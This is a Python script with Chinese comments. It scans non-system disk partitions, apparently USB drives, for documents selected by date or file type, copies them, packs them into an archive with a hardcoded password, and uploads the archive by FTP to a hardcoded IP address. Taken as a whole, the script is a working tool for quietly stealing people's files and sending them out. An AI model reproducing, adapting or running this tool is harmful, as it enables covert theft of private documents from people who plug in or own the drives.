import os
import platform as pf
from shutil import copy as shutilCopy, make_archive
from time import sleep, strftime, localtime, time
from psutil import disk_partitions
from configparser import ConfigParser
import multiprocessing as mp
import time
import subprocess
from ftplib import FTP
import zipfile

"""
需求:
    1.按时间收集文件
    2.按文件类型收集文件
    3.加密压缩
    4.上传到服务器
整体设计的原理:
    1.初始化运行的变量
        get_files_use_date_dir      按时间收集文件时存放文件的文件夹
        get_files_use_type_dir      按类型收集文件时存放文件的文件夹
        find_type                   文件的类型
        find_date                   时间的大小
        ftp_host = ''               
        ftp_name = ''
        ftp_passwd = ''
    2.收集文件,两个函数,分别是get_file_by_date(),get_file_by_type()
    3.加密压缩文件zip_file()
    4.上传文件upload_zip()
"""


class GetFile():
    """
    函数用于初始化变量
    """
    file_date = ''
    file_type = ''
    getfile = ''
    data_file_path = ''
    type_file_path = ''
    usable_disk = []
    ftp_host = ''
    ftp_name = ''
    ftp_passwd = ''

    def __init__(self):
        if not os.path.isfile('config.ini'):
            with open('config.ini', 'w') as f:
                f.write(r'''
[find_file]
file_date=2019043035830
file_type=pdf
[path]
getfile = C:\Users\zz\Desktop\test
[FTP]
host=148.70.139.25
name=anonymous
passwd=passwd
''')
        config = ConfigParser()
        config.read('config.ini', encoding="utf-8")
        GetFile.file_date = config.get("find_file", "file_date")               # 从现在寻找到该时间点的文件
        GetFile.file_type = config.get("find_file", "file_type")               # 寻找的文件的类型
        GetFile.file_type = list('.' + i for i in GetFile.file_type.split(','))
        GetFile.getfile = config.get("path", "getfile")
        GetFile.data_file_path = os.path.join(GetFile.getfile, 'date_file')       # 文件的存储位置
        GetFile.type_file_path = os.path.join(GetFile.getfile, 'type_file')       # 文件的存储位置
        GetFile.file_zip = os.path.join(GetFile.getfile, 'file_zip')              # 文件的存储位置
        GetFile.usable_disk = []                                                  # 此电脑所具有的磁盘标签
        GetFile.ftp_host = config.get("FTP", "host")
        GetFile.ftp_name = config.get("FTP", "name")
        GetFile.ftp_passwd = config.get("FTP", "passwd")

    def get_usable_disk(self):
        """
        整个磁盘的卷标
        :return:
        """
        GetFile.usable_disk = []
        for i in disk_partitions():
            GetFile.usable_disk.append(i.device)
        if len(GetFile.usable_disk) == 0:
            sleep(7)
        else:
            sleep(2)
        return GetFile.usable_disk


    @staticmethod
    def do_copy(old, new):
        """
        文件的复制,在这里进行文件夹的建立,文件的复制
        :param old: 可移动文件的文件绝对名称,路径加上文件名
        :param new:复制目的地的路径加文件名
        :return:None
        """
        dir_temp = os.path.split(new)[0]  # 可以将路径名和文件名分开
        if not os.path.isdir(dir_temp):   # 如果不存在文件夹则创建文件夹
            os.makedirs(dir_temp)
        try:
            shutilCopy(old, new)
        except Exception as e:
            print(e)

    def test(self):
        print(GetFile.file_type)
        print(GetFile.file_date)
        print(GetFile.data_file_path)


def zip_file(path_file):
    """
    对文件夹进行加密压缩
    :param path_file: 需要进行压缩的文件夹
    :return:
    """
    target = path_file + ".zip"
    if pf.system() == "Windows":
        cmd = [r'.\rar\WinRAR.exe', 'a', '-p%s' % ('123'), target, path_file]
        p = subprocess.Popen(cmd)
        p.wait()
    else:
        cmd = ['zip', '-P %s' % ('123'), target, path_file]
        p = subprocess.Popen(cmd)
        p.wait()


def connect_ftp(host, user, passeord):
    ftp = FTP()
    ftp.connect(host, 21)
    ftp.login(user, passeord)
    return ftp


def upload_zip(ftp,local_filepath,sever_path,new_severfile,buffersize=1024):
    """
    上传ftp文件到服务器
    :param path_file:
    :return:
    """
    ftp.cwd("/")
    ftp.cwd(sever_path)
    with open(local_filepath, 'rb') as upload_file:
        ftp.storbinary('STOR ' + new_severfile, upload_file, buffersize)
    ftp.set_debuglevel(0)
    upload_file.close()


def get_will_dest_name(save_path, filename):
    """
    :param filename: 文件的名称
    :return: 构造出的单个文件的文件名称
    """
    file_path_list = filename.split(os.sep)
    if len(file_path_list) == 1:
        return os.path.join(save_path, filename)
    else:
        return os.path.join(*([save_path] + file_path_list[1:]))


def get_file_by_type(*arg):
    """
    以文件的类型获取文件,进行复制
    :param arg:
    :return:
    """
    for dir_path, dir_names, file_names in os.walk(arg[0]):
        for filename in file_names:
            # ================1.过滤文件,规则buckFileText,还有就是除去临时文件==========
            file_split = os.path.splitext(filename)  # 分离文件名中的名称和后缀
            if (file_split[1].lower() not in arg[1]) or ('~$' in file_split[1]):
                continue
            #   ================2.文件的名称的构造====================
            absolute_file_name = os.path.join(dir_path, filename)
            will_copy_file = get_will_dest_name(arg[2], absolute_file_name)
            print(will_copy_file)
            # ================3.文件的复制===========================
            if not os.path.isfile(will_copy_file):
                GetFile.do_copy(old=absolute_file_name, new=will_copy_file)


def get_file_by_date(*arg):
    """
    以文件的修改时间获取文件
    :param arg:
    :return:
    """
    for dir_path, dir_names, file_names in os.walk(arg[0]):
        for filename in file_names:
            # ================1.过滤文件,规则buckFileText,还有就是除去临时文件==========
            absolute_file_name = os.path.join(dir_path, filename)
            date = time.strftime('%Y%m%d%H%M%S', time.localtime(os.path.getctime(absolute_file_name)))
            if arg[1] > date:   # 进行时间的过滤
                continue
            try:     # 这里预防文件过大,排除一些文件
                file_split = os.path.splitext(filename)  # 分离文件名中的名称和后缀
                if (file_split[1].lower() not in ['.pdf', '.txt', '.doc', '.html', '.docx', '.ppt' ]) or ('~$' in file_split[1]):
                    continue
            except Exception as e:
                print(e)
            #  ================2.文件的名称的构造====================
            absolute_file_name = os.path.join(dir_path, filename)
            will_copy_file = get_will_dest_name(arg[2], absolute_file_name)
            print(absolute_file_name)
            # ================3.文件的复制===========================
            if not os.path.isfile(will_copy_file):
                GetFile.do_copy(old=absolute_file_name, new=will_copy_file)


def main(type_choose):
    # 1.文件的复制
    p = mp.Pool(10)  # 创建1条线程
    for i in procer.get_usable_disk():
        if os.path.split(i)[0] in ['C:\\', 'D:\\', 'H:\\' ]:   # 屏蔽c,e磁盘
            continue
        if type_choose == 1:
            p.apply_async(get_file_by_date, (i, GetFile.file_date, GetFile.data_file_path))  # 时间类型收集文件
        else:
            p.apply_async(get_file_by_type, (i, GetFile.file_type, GetFile.type_file_path))  # 文件类型收集文件
    p.close()
    p.join()
    # 2.文件的压缩和上传
    if type_choose == 1:
        zip_file(GetFile.data_file_path)
        list_file = os.path.split(GetFile.data_file_path)
        upload_zip(ftp, GetFile.data_file_path + '.zip', './', list_file[1]+'.zip')
    else:
        zip_file(GetFile.type_file_path)
        list_file = os.path.split(GetFile.type_file_path)
        upload_zip(ftp, GetFile.type_file_path + '.zip', './', list_file[1] + '.zip')


if __name__ == '__main__':
    try:
        procer = GetFile()
        ftp = connect_ftp(GetFile.ftp_host, GetFile.ftp_name, GetFile.ftp_passwd)
        if ftp == None:
            print("连接服务器失败")
        main(1)
    except Exception as e:
        print(e)




